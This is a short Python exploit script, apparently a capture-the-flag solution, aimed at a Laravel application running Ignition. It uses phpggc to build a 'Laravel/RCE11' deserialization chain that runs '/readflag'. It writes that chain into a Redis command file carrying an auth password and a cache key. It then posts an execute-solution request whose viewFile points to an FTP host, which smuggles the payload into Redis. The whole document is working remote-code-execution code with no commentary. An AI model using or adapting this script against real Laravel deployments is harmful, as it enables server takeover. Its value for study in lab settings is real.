import re
import requests
import subprocess

TARGET_FILE = "a.txt"
def generate():
    key = 'laravel_database_laravel_cache:LaW8sFmh4adsj2m7Sapa0r47RFu101PpQKkRuCFh'

    chain = subprocess.check_output(['php', '/home/paml/tools/phpggc/phpggc', 'Laravel/RCE11', 'system', '/readflag', '-a', '-j','-w', '/home/paml/ascis_go/solve/process_serialized.php']).decode().strip()
    encoded_char = re.findall(r'\\[a-f0-9]{2}', chain)
    old_length = chain.split(':')[1]
    length = int(old_length) + 2 * len(encoded_char)
    chain = chain.replace(old_length, str(length))
    assert isinstance(chain, str)

    with open(TARGET_FILE, 'w') as f:
        f.write(f'auth ASCISRedis\r\nset {key} {chain}\r\n')

generate()

json = """{
            "solution":"Facade\\\\Ignition\\\\\\u0053olutions\\\\MakeViewVariableOptional\\u0053olution",
            "parameters": {
                "variableName":"username",
                "viewFile":"ftp://172.17.0.1:3535/a.txt"
            }
        }"""

burp0_url = "http://127.0.0.1:2808/_ignition/execute-solution"
burp0_headers = {"Content-Type": "application/json"}
r = requests.post(burp0_url, headers=burp0_headers, data=json)

print(r.text)